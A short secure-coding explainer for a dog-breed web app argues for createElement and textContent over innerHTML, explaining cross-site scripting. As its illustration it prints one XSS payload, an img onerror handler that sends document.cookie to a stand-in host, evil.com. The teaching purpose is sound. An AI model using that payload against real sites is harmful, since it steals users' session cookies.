# Why createElement instead of innerHTML

## The choice

There are two ways to add content to the page:

```javascript
// innerHTML — fast to write, dangerous with external data
container.innerHTML = `<p class="breed-name">${name}</p>`;

// createElement + textContent — more code, but safe
const heading = document.createElement("p");
heading.className = "breed-name";
heading.textContent = name;
container.appendChild(heading);
```

I use createElement + textContent. Always.

## Why

The breed names and descriptions in this app come from the Dog API — a server I don't control. If that API were ever compromised and returned something like this as a breed name:

```
<img src=x onerror="document.location='https://evil.com?cookies='+document.cookie">
```

innerHTML would inject that as real HTML. The browser would execute the onerror handler and send my cookies to an attacker. This is called **cross-site scripting (XSS)**.

textContent treats everything as plain text. That malicious string would just display as text on screen — ugly but harmless.

## When innerHTML might be okay

If the content is hardcoded in your own source code (not from a user, not from an API, not from a URL parameter), innerHTML is technically safe. But Prof. Teeters says it's better to build the habit of never using it, because one day you'll forget which data is "safe" and which isn't.

## The trade-off

createElement is more verbose — five lines instead of one. But it's explicit about what's happening. Each line creates one element, sets one property, or adds one child. When something looks wrong on screen, I can debug line by line.

— HAP 🟠
